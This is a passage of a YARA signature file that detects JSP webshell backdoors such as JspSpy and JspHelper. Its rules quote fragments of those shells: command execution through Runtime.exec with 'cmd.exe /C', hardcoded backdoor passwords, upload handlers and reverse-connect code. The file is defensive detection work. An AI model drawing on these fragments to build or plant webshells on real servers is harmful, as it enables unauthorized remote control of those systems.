        hash1 = "0e373739c55c3a79f033d10214ad88a700c7d3ee862d35bf71d0c36578454277"
    strings:
        $s1 = "out.println(\"<html><head><title>JspSpy</title><style type=\\\"text/css\\\">\"+" fullword ascii
        $s2 = "JSession.setAttribute(\"MSG\",\"<span style='color:red'>Upload File Failed!</span>\");" fullword ascii
        $s3 = "oardData.setData('Text', document.getElementById('ip').innerText));alert('ok')}\\\">copy</a></td>\"+" fullword ascii
        $s4 = "JSession.setAttribute(MSG,\"<span style='color:green'>Upload File Success!</span>\");" fullword ascii
        $s5 = "private static final String PW = \"diroverflow\"; //password" fullword ascii
        $s6 = "File f = new File(JSession.getAttribute(CURRENT_DIR)+\"/\"+fileBean.getFileName());" fullword ascii
        $s7 = "<td><span style=\\\"float:right;\\\">JspSpy Ver: 2010</span>\"+request.getHeader(\"host\")+\" (<span id='ip'>\"+InetAddress.getL" ascii
        $s8 = ").getHostAddress()+\"</span>) | <a href=\\\"javascript:if (!window.clipboardData){alert('only support IE!');}else{void(window.cl" ascii
        $s9 = "oString()+\"/exportdata.txt\")+\"\\\" size=\\\"100\\\" class=\\\"input\\\"/>\"+" fullword ascii
        $s10 = "<td><span style=\\\"float:right;\\\">JspSpy Ver: 2010</span>\"+request.getHeader(\"host\")+\" (<span id='ip'>\"+InetAddress.getL" ascii
        $s11 = "\" <input type=\\\"submit\\\" class=\\\"bt\\\" value=\\\"Export\\\"/><br/><br/>\"+BACK_HREF+\"</td>\"+" fullword ascii
        $s12 = "\"<!--<span style=\\\"font:11px Verdana;\\\">Copyright &copy; 2010</span>--></p>\"+" fullword ascii
        $s13 = "\"    <hr/>Export \\\"<span style='color:red;font-weight:bold'>\"+(Util.isEmpty(sql) ? table : sql.replaceAll(\"\\\"\",\"&quot;" ascii
        $s14 = "response.getWriter().println(\"<div style=\\\"padding:10px;border-bottom:1px solid #fff;border-top:1px solid #ddd;background:#ee" ascii
        $s15 = "/option><option value='ISO-8859-1'>ISO-8859-1</option></select>\"+" fullword ascii
    condition:
        ( uint16(0) == 0x253c and filesize < 400KB and ( 8 of them ) ) or ( all of them )
}

rule d897704943e335715e3589551c007622628fc9d1
{
    meta:
        description = "jsp - file d897704943e335715e3589551c007622628fc9d1.jsp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "9fd6d8bd2e7d3f84812647c17333360cbbb9a5ad9aa288fb90e889a9ae5b12a3"
    strings:
        $s1 = "(request.getParameter(\"t\").getBytes());" fullword ascii
    condition:
        ( uint16(0) == 0x253c and filesize < 1KB and ( all of them ) ) or ( all of them )
}

rule sig_4b3d36ec426fb0be788ba74a9de3cf22e9c62fde
{
    meta:
        description = "jsp - file 4b3d36ec426fb0be788ba74a9de3cf22e9c62fde.jsp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "7aa89ae3f2118e6c5eeefab268f4dca602b082edb3c571bdc38b2bc8301a438a"
    strings:
        $s1 = "new OnLineConnector(pro.getErrorStream(),response.getOutputStream(),\"exeRclientO\",olp).start();//????????????" fullword ascii
        $s2 = "private static final String PW = \"xo\"; //password" fullword ascii
        $s3 = "8px;\\\" /> <input type=\\\"submit\\\" name=\\\"submit\\\" value=\\\"Scan\\\" id=\\\"submit\\\" class=\\\"bt\\\" />\"+" fullword ascii
    condition:
        ( uint16(0) == 0x253c and filesize < 200KB and ( all of them ) ) or ( all of them )
}

rule c28fd0717d3b18f52f8792d4395d16b2c6255191
{
    meta:
        description = "jsp - file c28fd0717d3b18f52f8792d4395d16b2c6255191.jsp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "b5e9cd17caf4344895afca031a55535af49189c60a4b05095425931c9ab1b11b"
    strings:
        $x1 = "Process ls_proc = Runtime.getRuntime().exec(comm, null, new File(dir));" fullword ascii
        $x2 = "request.setAttribute(\"error\", \"Execution of native commands is not allowed!\");" fullword ascii
        $x3 = "* Command of the shell interpreter and the parameter to run a programm" fullword ascii
        $s4 = ".processData(request.getInputStream(), bound, tempdir, clength);" fullword ascii
        $s5 = "<b><%=convertFileSize(size)%> in <%=fileCount%> files in <%=f.getName()%>. Compression ratio: <%=(f.length() * 100) / size%>%" fullword ascii
        $s6 = "static String startProcess(String command, String dir) throws IOException {" fullword ascii
        $s7 = "request.setAttribute(\"error\", \"Reading of \" + f.getName() + \" aborted. Error: \"" fullword ascii
        $s8 = "request.setAttribute(\"error\", \"You are not allowed to access \" + ht.get(\"dir\"));" fullword ascii
        $s9 = "* Max time in ms a process is allowed to run, before it will be terminated" fullword ascii
        $s10 = "response.setHeader(\"Content-Disposition\", \"attachment;filename=\\\"\" + f.getName()" fullword ascii
        $s11 = "if (System.currentTimeMillis() - start > MAX_PROCESS_RUNNING_TIME) {" fullword ascii
        $s12 = "response.setHeader(\"Content-Disposition\", \"attachment;filename=\\\"rename_me.zip\\\"\");" fullword ascii
        $s13 = "request.setAttribute(\"error\", \"You are not allowed to access \" + request.getAttribute(\"dir\"));" fullword ascii
        $s14 = "private static final long MAX_PROCESS_RUNNING_TIME = 30 * 1000; //30 seconds" fullword ascii
        $s15 = "request.setAttribute(\"error\", \"Directory \" + f.getAbsolutePath() + \" does not exist.\");" fullword ascii
        $s16 = "\"Content-Disposition\", \"inline;filename=\\\"temp.txt\\\"\");" fullword ascii
        $s17 = "request.setAttribute(\"error\", \"You are not allowed to access \" + ef.getAbsolutePath());" fullword ascii
        $s18 = "request.setAttribute(\"error\", \"You are not allowed to access \" + new_f.getAbsolutePath());" fullword ascii
        $s19 = "request.setAttribute(\"error\", \"You are not allowed to access \" + f.getAbsoluteFile());" fullword ascii
        $s20 = "request.setAttribute(\"error\", \"You are not allowed to access \" + f_new.getAbsolutePath());" fullword ascii
    condition:
        ( uint16(0) == 0x253c and filesize < 200KB and ( 1 of ($x*) and 4 of them ) ) or ( all of them )
}

rule sig_032c141019ceabee44e013e27d7e77bc4995125a
{
    meta:
        description = "jsp - file 032c141019ceabee44e013e27d7e77bc4995125a.jsp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "4aa34b6d453b0f2f723d699553533b70accad316d69308987de458664ed8dd79"
    strings:
        $s1 = "private static final String PW = \"a1b2c3a4\"; //password" fullword ascii
    condition:
        ( uint16(0) == 0x253c and filesize < 200KB and ( all of them ) ) or ( all of them )
}

rule b9fab60c8f75ff5b7eb3c18731f8ab2441391549
{
    meta:
        description = "jsp - file b9fab60c8f75ff5b7eb3c18731f8ab2441391549.jsp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "9e510dffd01cef28047043c0331f408279042cf724c8d2a76968e5eb40446caa"
    strings:
        $x1 = "<td><span style=\\\"float:right;\\\"><a href=\\\"http://www.forjj.com\\\" target=\\\"_blank\\\">JspSpy Ver: 2010 </a></span>\"+r" ascii
        $s2 = "<td><span style=\\\"float:right;\\\"><a href=\\\"http://www.forjj.com\\\" target=\\\"_blank\\\">JspSpy Ver: 2010 </a></span>\"+r" ascii
        $s3 = "response.getWriter().println(\"<div style=\\\"padding:10px;border-bottom:1px solid #fff;border-top:1px solid #ddd;background:#ee" ascii
        $s4 = "\">Copyright (C) 2010 <a href=\\\"http://www.forjj.com\\\" target=\\\"_blank\\\">http://www.Forjj.com/</a>&nbsp;&nbsp;<a target=" ascii
        $s5 = "\"<!--<span style=\\\"font:11px Verdana;\\\">Copyright &copy; 2010 NinTy </span><a href=\\\"http://www.forjj.com\\\" target=\\\"" ascii
        $s6 = "\"<!--<span style=\\\"font:11px Verdana;\\\">Copyright &copy; 2010 NinTy </span><a href=\\\"http://www.forjj.com\\\" target=\\\"" ascii
        $s7 = "JSession.setAttribute(\"MSG\",\"<span style='color:red'>Upload File Failed!</span>\");" fullword ascii
        $s8 = "JSession.setAttribute(MSG,\"<span style='color:green'>Upload File Success!</span>\");" fullword ascii
        $s9 = "private static final String PW = \"baojuhua\"; //password" fullword ascii
        $s10 = "File f = new File(JSession.getAttribute(CURRENT_DIR)+\"/\"+fileBean.getFileName());" fullword ascii
        $s11 = "oString()+\"/exportdata.txt\")+\"\\\" size=\\\"100\\\" class=\\\"input\\\"/>\"+" fullword ascii
        $s12 = "der(\"host\")+\" (<span id='ip'>\"+InetAddress.getLocalHost().getHostAddress()+\"</span>) | <a href=\\\"javascript:if (!window.c" ascii
        $s13 = "\" <input type=\\\"submit\\\" class=\\\"bt\\\" value=\\\"Export\\\"/><br/><br/>\"+BACK_HREF+\"</td>\"+" fullword ascii
        $s14 = "* CY . I Love You." fullword ascii
        $s15 = "* by n1nty" fullword ascii
        $s16 = "\"    <hr/>Export \\\"<span style='color:red;font-weight:bold'>\"+(Util.isEmpty(sql) ? table : sql.replaceAll(\"\\\"\",\"&quot;" ascii
        $s17 = "dData){alert('only support IE!');}else{void(window.clipboardData.setData('Text', document.getElementById('ip').innerText));alert" ascii
        $s18 = "/option><option value='ISO-8859-1'>ISO-8859-1</option></select>\"+" fullword ascii
    condition:
        ( uint16(0) == 0x253c and filesize < 400KB and ( 1 of ($x*) and 4 of them ) ) or ( all of them )
}

rule e564ca392f108addd7728966fdbdad98cfe5660e
{
    meta:
        description = "jsp - file e564ca392f108addd7728966fdbdad98cfe5660e.jsp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "13835efa90152ba33e0095d1a31b0a39f65ee0c8f55a01e8752b49691a9c7b8c"
    strings:
        $s1 = "<%@page import=\"java.io.*,java.util.*,java.net.*,java.sql.*,java.text.*\"%><%!String Pwd=\"rcoil\";String EC(String s,String c)" ascii
        $s2 = "\")}else if(Z.equals(\"M\")){String[]c={z1.substring(2),z1.substring(0,2),z2};Process p=Runtime.getRuntime().exec(c);MM(p.getInp" ascii
        $s3 = "stance();Connection c=DriverManager.getConnection(x[1].trim());if(x.length>2){c.setCatalog(x[2].trim())}return c}void AA(StringB" ascii
        $s4 = "tream(),sb);MM(p.getErrorStream(),sb)}else if(Z.equals(\"N\")){NN(z1,sb)}else if(Z.equals(\"O\")){OO(z1,sb)}else if(Z.equals(\"P" ascii
        $s5 = "uffer sb)throws Exception{File r[]=File.listRoots();for(int i=0;i\"+\"|\").getBytes(),0,3);while((n=is.read(b,0,512))!=-1){os.wr" ascii
    condition:
        ( uint16(0) == 0x253c and filesize < 6KB and ( all of them ) ) or ( all of them )
}

rule sig_3e6a3482b9db64c2ebe61b23df8422756fce8182
{
    meta:
        description = "jsp - file 3e6a3482b9db64c2ebe61b23df8422756fce8182.jsp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "b6e8e328b832590e520095fe35028a918eae930c38e7c07e0b37ac0da08eeb14"
    strings:
        $s1 = "out.println(\"<a href='\"+request.getScheme()+\"://\"+request.getServerName()+\":\"+request.getServerPort()+request.getReq" fullword ascii
        $s2 = ":</font><input type=\"text\" size=\"70\" name=\"path\" value=\"<%out.print(getServletContext().getRealPath(\"/\")); %>\">" fullword ascii
        $s3 = "String context=new String(request.getParameter(\"context\").getBytes(\"ISO-8859-1\"),\"gb2312\");" fullword ascii
        $s4 = "String path=new String(request.getParameter(\"path\").getBytes(\"ISO-8859-1\"),\"gb2312\");" fullword ascii
        $s5 = "<form name=\"frmUpload\" method=\"post\" action=\"\">" fullword ascii
        $s6 = ":</font><%out.print(request.getRealPath(request.getServletPath())); %>" fullword ascii
        $s7 = "<%@page import=\"java.io.*,java.util.*,java.net.*\"%>" fullword ascii
        $s8 = "<%@page contentType=\"text/html;charset=gb2312\"%>" fullword ascii
        $s9 = ":<textarea name=\"context\" id=\"context\" style=\"width: 51%; height: 150px;\"></textarea>" fullword ascii
        $s10 = "out.println(\"<a href='\"+request.getScheme()+\"://\"+request.getServerName()+\":\"+request.getServerPort()+request.getRequestUR" ascii
        $s11 = "if(request.getParameter(\"context\")!=null)" fullword ascii
        $s12 = "<input type=\"submit\" name=\"btnSubmit\" value=\"Upload\">" fullword ascii
        $s13 = "pt.write(context.getBytes());" fullword ascii
        $s14 = "body { color:red; font-size:12px; background-color:white; }" fullword ascii
    condition:
        ( uint16(0) == 0x253c and filesize < 5KB and ( 8 of them ) ) or ( all of them )
}

rule sig_7eaeda99742d29a52d3578388b5f28d8a712fa73
{
    meta:
        description = "jsp - file 7eaeda99742d29a52d3578388b5f28d8a712fa73.jsp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "04ceac0d310cde0e605e38d0e8b841d6f801b57cc6fef5ef7b792612db9acea8"
    strings:
        $s1 = "out.println(\"<html><head><title>JspHelper Codz By - Leo</title><style type=\\\"text/css\\\">\"+" fullword ascii
        $s2 = "<td><span style=\\\"float:right;\\\"><a href=\\\"http://www.baidu.com\\\" target=\\\"_blank\\\">JspHelper Ver: 2010</a></span>\"" ascii
        $s3 = "response.getWriter().println(\"<div style=\\\"padding:10px;border-bottom:1px solid #fff;border-top:1px solid #ddd;background:#ee" ascii
        $s4 = "response.setHeader(\"Content-Disposition\",\"attachment;filename=\"+URLEncoder.encode(f.getName(),\"GBK\"));" fullword ascii
        $s5 = "private static final String PW = \"admin.com\"; //password" fullword ascii
        $s6 = "\">Copyright (C) 2009 <a href=\\\"http://www.baidu.com\\\" target=\\\"_blank\\\">http://www.baidu.com/</a> All Rights Reserved." ascii
        $s7 = "<td><span style=\\\"float:right;\\\"><a href=\\\"http://www.baidu.com\\\" target=\\\"_blank\\\">JspHelper Ver: 2010</a></span>\"" ascii
        $s8 = "\"<span style=\\\"font:11px Verdana;\\\">Copyright &copy; 2010 Leo </span><a href=\\\"http://www.baidu.com\\\" target=\\\"_blank" ascii
        $s9 = "\"<span style=\\\"font:11px Verdana;\\\">Copyright &copy; 2010 Leo </span><a href=\\\"http://www.baidu.com\\\" target=\\\"_blank" ascii
        $s10 = "<%@ page contentType=\"text/html; charset=GBK\" language=\"java\" import=\"java.sql.*\"%>" fullword ascii
        $s11 = "new OnLineConnector(pro.getErrorStream(),response.getOutputStream(),\"exeRclientO\",olp).start();//??????" fullword ascii
        $s12 = "private static final String PW_SESSION_ATTRIBUTE = \"SpyPwd\";" fullword ascii
        $s13 = "eader(\"host\")+\" (\"+InetAddress.getLocalHost().getHostAddress()+\")</td>\"+" fullword ascii
        $s14 = ";\\\" /> <input type=\\\"submit\\\" name=\\\"submit\\\" value=\\\"Scan\\\" id=\\\"submit\\\" class=\\\"bt\\\" />\"+" fullword ascii
        $s15 = "String sql = new String(request.getParameter(\"sql\").getBytes(\"GBK\"));" fullword ascii
        $s16 = "* Suit for Chinese Characterset." fullword ascii
        $s17 = "\" <option value='sun.jdbc.odbc.JdbcOdbcDriver`jdbc:odbc:Driver={Microsoft Access Driver (*.mdb)};DBQ=C:\\\\Leo.mdb'>Access</opt" ascii
        $s18 = "\" <option value='sun.jdbc.odbc.JdbcOdbcDriver`jdbc:odbc:Driver={Microsoft Access Driver (*.mdb)};DBQ=C:\\\\Leo.mdb'>Access</opt" ascii
        $s19 = "u.com</a></p>\"+" fullword ascii
        $s20 = "\"<p><input type=\\\"hidden\\\" name=\\\"selectDb\\\" value=\\\"\"+selectDb+\"\\\"><input type=\\\"hidden\\\" name=\\\"o\\\" val" ascii
    condition:
        ( uint16(0) == 0x6f43 and filesize < 200KB and ( 8 of them ) ) or ( all of them )
}

rule sig_79e5206d86bee52d8239a732107c9d7fe7779676
{
    meta:
        description = "jsp - file 79e5206d86bee52d8239a732107c9d7fe7779676.jsp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "11394a4bf56a01a0c77f3657abc4c90d134fb8579965aa3acb889cf43fb047c1"
    strings:
        $s1 = "private static final String PW = \"kity\"; //password" fullword ascii
    condition:
        ( uint16(0) == 0x253c and filesize < 200KB and ( all of them ) ) or ( all of them )
}

rule sig_68fe4d31b82f416fb2d3a32f1cc179060096e8a5
{
    meta:
        description = "jsp - file 68fe4d31b82f416fb2d3a32f1cc179060096e8a5.jsp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "b798b2eef87755b26b30e4d3483582adcc7d0a20d87cb78c8a9cd5c7a32d7730"
    strings:
        $s1 = "<td align=\"right\">darkst by <a href=\"mailto:376186027@qq.com\">New4</a> and welcome to <a href=\"http://www.darkst.com\" targ" ascii
        $s2 = "<td align=\"right\">darkst by <a href=\"mailto:376186027@qq.com\">New4</a> and welcome to <a href=\"http://www.darkst.com\" targ" ascii
        $s3 = "<td><a title=\\\"\" + files[n].getName() + \"\\\">\" + strCut(files[n].getName(), 50) + \"</a></td>\\n\";" fullword ascii
        $s4 = "document.fileList.action = \\\"\" + curUri + \"&curPath=\" + path + \"&fsAction=copyto&dstPath=\" + \"\\\" + toPath;\\n\";" fullword ascii
        $s5 = "<td>[<a href=\\\"\" + curUri + \"&curPath=\" + pathConvert(curFile.getParent()) + \"\\\">" fullword ascii
        $s6 = "ydC9mb3JtLWRhdGE7Pj47bDxpPDE5Pjs+O2w8dDxAMDw7Ozs7Ozs7Ozs7Pjs7Pjs+Pjs+PjtsPE5ld0ZpbGU7TmV3RmlsZTtOZXdEaXJlY3Rvcnk7TmV3RGlyZWN0b3J" ascii /* base64 encoded string 't/form-data;>>;l<i<19>;>;l<t<@0<;;;;;;;;;;>;;>;>>;>>;l<NewFile;NewFile;NewDirectory;NewDirector' */
        $s7 = "ut(files[n].getName(), 50) + \"&gt;</a></td>\\n\";" fullword ascii
        $s8 = "private String _password = \"156156\";" fullword ascii
        $s9 = "ert(files[n].getPath()) + \"</a></td>\\n\";" fullword ascii
        $s10 = "<td width=\\\"15%\\\" align=\\\"center\\\">\" + files[n].length() + \"</td>\\n\";" fullword ascii
        $s11 = "document.dbInfo.sql.value = \\\"\\\";\";" fullword ascii
        $s12 = "<textarea name=\\\"fileContent\\\" cols=\\\"80\\\" rows=\\\"32\\\">\\n\";" fullword ascii
        $s13 = "5O0RCX3JCX01TU1FMO0RCX3JCX01TU1FMO0RCX3JCX0FjY2VzcztEQl9yQl9BY2Nlc3M7Pj7Z5iNIVOaWZWuK0pv8lCMSbhytgQ==\" />" fullword ascii
        $s14 = "document.openfile.action=\\\"\" + curUri + \"&curPath=\" + pathConvert(curFile.getParent()) + \"\\\" + fileName + \\\"&fsAction=" ascii
        $s15 = "sRet += \"<meta http-equiv=\\\"refresh\\\" content=\\\"2;url=\" + curUri + \"&curPath=\" + path + \"&fsAction=open\" + \"\\\" />" ascii
        $s16 = "document.openfile.action=\\\"\" + curUri + \"&curPath=\" + pathConvert(curFile.getParent()) + \"\\\" + fileName + \\\"&fsAction=" ascii
        $s17 = "<TD align=\"left\"><FONT face=\"webdings\" color=\"#ffffff\"> 8</FONT><FONT face=\"Verdana, Arial, Helvetica, sans-serif\" c" fullword ascii
        $s18 = "<form enctype=\\\"multipart/form-data\\\" method=\\\"post\\\" name=\\\"upload\\\" action=\\\"\" + curUri + \"&curPath=\" + path " ascii
        $s19 = "<form enctype=\\\"multipart/form-data\\\" method=\\\"post\\\" name=\\\"upload\\\" action=\\\"\" + curUri + \"&curPath=\" + path " ascii
        $s20 = "\\\">edit</a>>\" : \"\") + \"</td>\\n\";" fullword ascii
    condition:
        ( uint16(0) == 0x253c and filesize < 200KB and ( 8 of them ) ) or ( all of them )
}

rule sig_4762f36ca01fb9cda2ab559623d2206f401fc0b1
{
    meta:
        description = "jsp - file 4762f36ca01fb9cda2ab559623d2206f401fc0b1.jsp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "f91f6009cfee1189db44edcba85b2d9bad819331ee4e369cdcb4e21710c6768c"
    strings:
        $s1 = "private static final String PW = \"ninty\"; //password" fullword ascii
    condition:
        ( uint16(0) == 0x253c and filesize < 200KB and ( all of them ) ) or ( all of them )
}

rule sig_83a86bcf989dbbd2b9a24e4497bc9d98e212bf73
{
    meta:
        description = "jsp - file 83a86bcf989dbbd2b9a24e4497bc9d98e212bf73.jsp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "8448abdc419d97ace120d9f804e3ecd0547457ec4a77ce3a308b6d50b78ed608"
    strings:
        $x1 = "Process p = Runtime.getRuntime().exec(\"cmd.exe /C \" + cmd);" fullword ascii
        $x2 = "// note that linux = cmd and windows = \"cmd.exe /c + cmd\" " fullword ascii
        $s3 = "BufferedReader sI = new BufferedReader(new InputStreamReader(p.getInputStream()));" fullword ascii
        $s4 = "<FORM METHOD=GET ACTION='cmdjsp.jsp'>" fullword ascii
        $s5 = "<!--    http://michaeldaw.org   2006    -->" fullword ascii
        $s6 = "<INPUT name='cmd' type=text>" fullword ascii
        $s7 = "if(cmd != null) {" fullword ascii
        $s8 = "while((s = sI.readLine()) != null) {" fullword ascii
    condition:
        ( uint16(0) == 0x2f2f and filesize < 2KB and ( 1 of ($x*) and all of them ) ) or ( all of them )
}

rule sig_70c3d62344418d4745bd5047ecadfd89271305d6
{
    meta:
        description = "jsp - file 70c3d62344418d4745bd5047ecadfd89271305d6.jsp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "21fc92b2d8e6c439a04cb584d0b33c49e6c9460d754429795f3c7de68777772c"
    strings:
        $s1 = "e(request.getParameter(\"t\").getBytes());%>" fullword ascii
    condition:
        ( uint16(0) == 0x253c and filesize < 1KB and ( all of them ) ) or ( all of them )
}

rule sig_51a25a3ec9633d02d856e910b3c48f8771d960aa
{
    meta:
        description = "jsp - file 51a25a3ec9633d02d856e910b3c48f8771d960aa.jsp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "235734c9bcff91f33a8430859299bd30489bf8865279f81571c571b9797d070f"
    strings:
        $s1 = "<td align=\"right\">created by <a href=\"mailto:luoluonet@hotmail.com\">luoluo</a> and welcome to <a href=\"http://www.ph4nt0m.o" ascii
        $s2 = "sRet += \"  <td><a title=\\\"\" + files[n].getName() + \"\\\">\" + strCut(files[n].getName(), 50) + \"</a></td>\\n\";" fullword ascii
        $s3 = "sRet += \"  <td>[<a href=\\\"\" + curUri + \"&curPath=\" + pathConvert(curFile.getParent()) + \"\\\">" fullword ascii
        $s4 = "\"\\\">&lt;\" + strCut(files[n].getName(), 50) + \"&gt;</a></td>\\n\";" fullword ascii
        $s5 = "result += \"<meta http-equiv=\\\"refresh\\\" content=\\\"2;url=\" + request.getRequestURI() + \"?action=\" + request.getParamete" ascii
        $s6 = "\"\\\">\" + pathConvert(files[n].getPath()) + \"</a></td>\\n\";" fullword ascii
        $s7 = "<form name=\"config\" method=\"post\" action=\"<%=request.getRequestURI() + \"?action=config&cfAction=save\"%>\" onSubmit=\"java" ascii
        $s8 = "sRet += \"  <td width=\\\"15%\\\" align=\\\"center\\\">\" + files[n].length() + \"</td>\\n\";" fullword ascii
        $s9 = "private String _password = \"1q1q1q\";" fullword ascii
        $s10 = "_url = \"jdbc:mysql://\" + dbServer + \":\" + dbPort + \";User=\" + dbUsername + \";Password=\" + dbPassword + \";DatabaseName=" ascii
        $s11 = "_url = \"jdbc:microsoft:sqlserver://\" + dbServer + \":\" + dbPort + \";User=\" + dbUsername + \";Password=\" + dbPassword + \";" ascii
        $s12 = "if (request.getParameter(\"command\") != null) {  " fullword ascii
        $s13 = ".getPath()) + \"\\\" /></td>\\n\";" fullword ascii
        $s14 = "<td align=\"right\">created by <a href=\"mailto:luoluonet@hotmail.com\">luoluo</a> and welcome to <a href=\"http://www.ph4nt0m.o" ascii
        $s15 = "<input type=\"password\" size=\"25\" name=\"password\" class=\"textbox\" />" fullword ascii
        $s16 = "target=\"_blank\">" fullword ascii
        $s17 = "sRet += \" if (folderName != null && folderName != false && ltrim(folderName) != \\\"\\\") {\\n\";" fullword ascii
        $s18 = "sRet += \"<meta http-equiv=\\\"refresh\\\" content=\\\"2;url=\" + curUri + \"&curPath=\" + path + \"&fsAction=open\" + \"\\\" />" ascii
        $s19 = "=\\\" + document.fileList.filesDelete[selected].value;\";" fullword ascii
        $s20 = "Action=open\" + \"\\\">edit</a>>\" : \"\") + \"</td>\\n\";" fullword ascii
    condition:
        ( uint16(0) == 0x253c and filesize < 200KB and ( 8 of them ) ) or ( all of them )
}

rule sig_362c4b8a2156b8fade4c83deffe464d1856cd763
{
    meta:
        description = "jsp - file 362c4b8a2156b8fade4c83deffe464d1856cd763.jsp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "7ff4cc8cbe98ffcc3ae3f9e3b9876cff9972f0ba4e082aa63658fb030a269e43"
    strings:
        $x1 = "Process ls_proc = Runtime.getRuntime().exec(comm, null, new File(cwd));" fullword ascii
        $s2 = "response.setHeader(\"Content-Disposition\",\"attachment; filename=\\\"\" + myfile__.getName() + \"\\\"\");" fullword ascii
        $s3 = "Process p = Runtime.getRuntime().exec(finals);" fullword ascii
        $s4 = "Hashtable ht = myParser.processData(request.getInputStream(), bound, xCwd, clength);" fullword ascii
        $s5 = "String shell_fake_name = \"login\";" fullword ascii
        $s6 = "AAAAAAAAAAAAAAB" ascii /* base64 encoded string '           ' */ /* reversed goodware string 'BAAAAAAAAAAAAAA' */
        $s7 = "String tmpdir = xcleanpath(System.getProperty(\"java.io.tmpdir\"));" fullword ascii
        $s8 = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" ascii /* base64 encoded string '                                                                                               ' */
        $s9 = "color:\" + shell_color + \";\" +" fullword ascii
        $s10 = "background:\" + shell_color + \";\" +" fullword ascii
        $s11 = "if(xrunexploit(xCwd,base64,port,request.getRemoteAddr())){" fullword ascii
        $s12 = "if((request.getParameter(\"cmd\")!=null) && (!request.getParameter(\"cmd\").equals(\"\"))){" fullword ascii
        $s13 = "else if((request.getParameter(\"btnListen\")!=null) && (!request.getParameter(\"btnListen\").equals(\"\"))){" fullword ascii
        $s14 = "String shell_password = \"admindejibahenxiao\";" fullword ascii
        $s15 = "//private final String lineSeparator = System.getProperty(\"line.separator\", \"\\n\");" fullword ascii
        $s16 = "cookieTable.put(cookies[i].getName(), cookies[i].getValue());" fullword ascii
        $s17 = "if(ht.get(\"btnNewUploadUrl\")!=null && !ht.get(\"btnNewUploadUrl\").equals(\"\")){" fullword ascii
        $s18 = "else if(ht.get(\"btnNewUploadLocal\")!=null && !ht.get(\"btnNewUploadLocal\").equals(\"\")){" fullword ascii
        $s19 = "String filename = xCwd + ht.get(\"filename\").toString().trim();" fullword ascii
        $s20 = "buff.append(\"<a href=\\\"?dir=\" + urlencode(xcleanpath(path)) + \"&properties=\" + urlencode(f) + \"\\\">\");" fullword ascii
    condition:
        ( uint16(0) == 0x253c and filesize < 200KB and ( 1 of ($x*) and 4 of them ) ) or ( all of them )
}

rule sig_94d1aaabde8ff9b4b8f394dc68caebf981c86587
{
    meta:
        description = "jsp - file 94d1aaabde8ff9b4b8f394dc68caebf981c86587.jsp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "706862017d0b10e466f2933bb703e75b420e6e94b558ae64679954fc3f900c1b"
    strings:
        $x1 = "System.out.println(\"getHostPort:\"+task);" fullword ascii
        $s2 = "System.out.println(\"getHtmlContext:\" + e.getMessage());" fullword ascii
        $s3 = "System.out.println(\"getCss:\" + e.getMessage());" fullword ascii
        $s4 = "System.out.println(\"getHtmlContext2:\" + e.getMessage());" fullword ascii
        $s5 = "String scantarget = useIp + i + \":\" + port[j];" fullword ascii
        $s6 = "System.out.println(\"end:\" + end);" fullword ascii
        $s7 = "System.out.println(\"start:\" + start);" fullword ascii
        $s8 = "String reaplce = \"href=\\\"http://127.0.0.1:8080/Jwebinfo/out.jsp?url=\";" fullword ascii
        $s9 = "String getHtmlContext(HttpURLConnection conn, String decode,boolean isError) {" fullword ascii
        $s10 = "String s = application.getRealPath(\"/\") + \"/port.txt\";" fullword ascii
        $s11 = "FileUtils.writeStringToFile(new File(cpath+\"/port.txt\"), s,\"UTF-8\",true);" fullword ascii
        $s12 = "<textarea name=\"post\" cols=40 rows=4>username=admin&password=admin</textarea>" fullword ascii
        $s13 = "//System.out.println(scantarget);" fullword ascii
        $s14 = "+ getHtmlContext(getHTTPConn(cssuuu), decode,false)" fullword ascii
        $s15 = "conn.addRequestProperty(\"User-Agent\"," fullword ascii
        $s16 = "java.net.HttpURLConnection conn = (java.net.HttpURLConnection) url" fullword ascii
        $s17 = "<textarea name=\"post\" cols=40 rows=4>SESSION:d89de9c2b4e2395ee786f1185df21f2c51438059222</textarea>" fullword ascii
        $s18 = "Referer:<input name=\"referer\" value=\"http://www.baidu.com\"" fullword ascii
        $s19 = "System.out.print(e.getLocalizedMessage());" fullword ascii
        $s20 = "System.out.print(e.getMessage());" fullword ascii
    condition:
        ( uint16(0) == 0x253c and filesize < 50KB and ( 1 of ($x*) and 4 of them ) ) or ( all of them )
}

rule sig_32008f2507fd97467849c1777516a25acfcb8f05
{
    meta:
        description = "jsp - file 32008f2507fd97467849c1777516a25acfcb8f05.jsp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "3cf4c8e664a7c1a3d832adcb228562261bb3e0463cd68497402bb1dba51fc4e1"
    strings:
